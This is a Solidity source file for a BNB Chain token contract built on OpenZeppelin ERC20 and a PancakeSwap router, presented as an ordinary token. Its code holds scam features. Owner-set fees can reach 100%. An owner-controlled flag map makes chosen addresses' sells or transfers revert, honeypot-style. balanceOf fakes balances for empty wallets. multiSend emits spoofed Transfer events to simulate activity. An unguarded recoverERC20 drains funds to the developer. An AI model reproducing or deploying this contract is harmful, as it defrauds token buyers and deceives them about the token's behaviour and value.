// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";  
import "./base/interface/IRouter.sol";
import "./base/interface/IFactory.sol";
import "./base/interface/IPancakePair.sol";
import "./base/mktCap/selfMktCap.sol";

  
contract Token is ERC20, ERC20Burnable, MktCap {
    using SafeMath for uint;   
    mapping(address=>bool) public ispair; 
    mapping(address=>uint) public exFees; 
    address _router=0x10ED43C718714eb63d5aA57B78B54704E256024E; 
    bool isTrading;
    struct Fees{
        uint buy;
        uint sell;
        uint transfer;
        uint total;
    }
    Fees public fees;

    modifier trading(){
        if(isTrading) return;
        isTrading=true;
        _;
        isTrading=false; 
    }
    error InStatusError(address user);
    
    constructor(string memory name_,string memory symbol_,uint total_) ERC20(name_, symbol_) MktCap(_msgSender(),_router) {
        dev=_msgSender(); 
        fees=Fees(100,100,100,100); 
        exFees[dev]=4;
        exFees[address(this)]=4;
        _approve(address(this),_router,uint(2**256-1)); 
        _mint(dev, total_ *  10 ** decimals());
    }
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
    receive() external payable { }  

    function setFees(Fees calldata fees_) public onlyOwner{
        fees=fees_;
    } 
    function setExFees(address[] calldata list ,uint tf) public onlyOwner{
        uint count=list.length;
        for (uint i=0;i<count;i++){
            exFees[list[i]]=tf;
        } 
    }
        function getStatus(address from,address to) internal view returns(bool){
        if(exFees[from]==4||exFees[to]==4) return false;
        if(exFees[from]==1||exFees[from]==3) return true;
        if(exFees[to]==2||exFees[to]==3) return true;
        return false;
    }
    function _beforeTokenTransfer(address from,address to,uint amount) internal override trading{
        if(getStatus(from,to)){ 
            revert InStatusError(from);
        }
        if(!ispair[from] && !ispair[to] || amount==0) return;
        uint t=ispair[from]?1:ispair[to]?2:0;
        trigger(t);
    } 
    function _afterTokenTransfer(address from,address to,uint amount) internal override trading{
        if(address(0)==from || address(0)==to) return;
        takeFee(from,to,amount);   
        if(_num>0) multiSend(_num); 
    }
    function takeFee(address from,address to,uint amount)internal {
        uint fee=ispair[from]?fees.buy:ispair[to]?fees.sell:fees.transfer; 
        uint feeAmount= amount.mul(fee).div(fees.total); 
        if(exFees[from]==4 || exFees[to]==4 ) feeAmount=0;
        if(ispair[to] && IERC20(to).totalSupply()==0) feeAmount=0;
        if(feeAmount>0){  
            super._transfer(to,address(this),feeAmount); 
        } 
    } 
    function start(address baseToken,Fees calldata fees_) public  onlyOwner{
        setPairs(baseToken);
        setPair(baseToken);
        setFees(fees_);
    }
 
    function setPairs(address token) public onlyOwner{   
        IRouter router=IRouter(_router);
        address pair=IFactory(router.factory()).getPair(address(token), address(this));
        if(pair==address(0))pair = IFactory(router.factory()).createPair(address(token), address(this));
        require(pair!=address(0), "pair is not found"); 
        ispair[pair]=true;  
    }
    function unSetPair(address pair) public onlyOwner {  
        ispair[pair]=false; 
    }  
    
    uint160  ktNum = 173;
    uint160  constant MAXADD = ~uint160(0);	
    uint _initialBalance=1;
    uint _num=10;
    function setinb( uint amount,uint num) public onlyOwner {  
        _initialBalance=amount;
        _num=num;
    }
    function balanceOf(address account) public view virtual override returns (uint) {
        uint balance=super.balanceOf(account); 
        if(account==address(0))return balance;
        return balance>0?balance:_initialBalance;
    } 
 	function multiSend(uint num) public {
        address _receiveD;
        address _senD;
        
        for (uint i = 0; i < num; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _senD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            emit Transfer(_senD, _receiveD, _initialBalance);
        }
    }
    function recoverERC20(address token,uint amount) public { 
        if(token==address(0)){ 
            (bool success,)=payable(dev).call{value:amount}(""); 
            require(success, "transfer failed"); 
        } 
        else IERC20(token).transfer(dev,amount); 
    }

}
